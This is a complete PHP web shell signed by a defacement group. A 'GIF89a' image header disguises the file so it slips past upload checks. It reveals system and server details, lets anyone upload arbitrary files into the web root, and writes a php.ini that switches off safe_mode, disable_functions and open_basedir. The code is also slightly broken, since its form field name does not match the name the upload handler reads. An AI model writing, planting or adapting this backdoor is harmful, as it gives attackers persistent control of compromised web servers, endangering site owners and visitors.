#################################################
#           reCoded by: Jakarta6etar            #
#          Team: Eldersc0de Securi7y            #
#         https://fb.com/jakarta.exploded.12    #
#-----------------------------------------------#
#    Thank's To IndoXploit and Xai Syndicate    #
#################################################

GIF89a;
<html>
<head>
<title>Jakarta6etar</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href='//fonts.googleapis.com/css?family=Fredoka+One' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Share+Tech+Mono' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Libre+Barcode+39+Extended+Text' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Pompiere' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="//zerobyte.id/styles.css">
</head>
  <Style>
    .bground {
    background-color: rgba(0, 30, 38, 0.7);
    position: fixed;
    z-index: -1;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}
div {
    display: block;
}
    .footer {
    font-family: 'Share Tech Mono';
    font-size: 17px;
    text-align: center;
}
    </style>
<body>
    <div class="bground"></div>
    <h1>Jakarta6etar</h1>
    </center><br>
    <div class="footer">&copy; 2015 - 2018<br><span>Eldersc0de Family</span></div>
</body>
<?php 
echo "<center>";
echo "<br>"; echo "<b>".php_uname()."</font></b><br>"; echo "<form method='post' enctype='multipart/form-data'>

 <input type='file' name='ins0m'>

 <input type='submit' name='upload' value='upload'>

 </form>"; $root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['elders']['name']; $dest = $root.'/'.$files; if(isset($_POST['upload'])) {
    if(is_writable($root)) {

 if(@copy($_FILES['elders']['tmp_name'], $dest)) {

 $web = "http://".$_SERVER['HTTP_HOST']."/";

 echo "Success Uploaded-> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";

 }

 else {             echo "Unable To Upload File";

 }

 }

 else {         if(@copy($_FILES['elders']['tmp_name'], $files))

 {

     echo "Upload Success <b>$files</b>";

     }

     else {             echo "Unable To Upload File";

     }

     }

     }
echo "<br>";
#######################
#Thank's to IndoXploit#
#######################
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
echo "<b><font color='green'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
echo "<br>";
echo "<b><font color='green'>Disable Functions: $show_ds</b></font><br><br>";
echo "<form method='post'>
<input type='submit' name='funct' value='Bypass Disabled Functions'>
</form>";
if($_POST['funct']) {
$file = 'php.ini';
file_put_contents($file,'safe_mode = OFF
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF');
echo "<font color='green'>Success Bypassing Disable Func.</font>";
}
?>
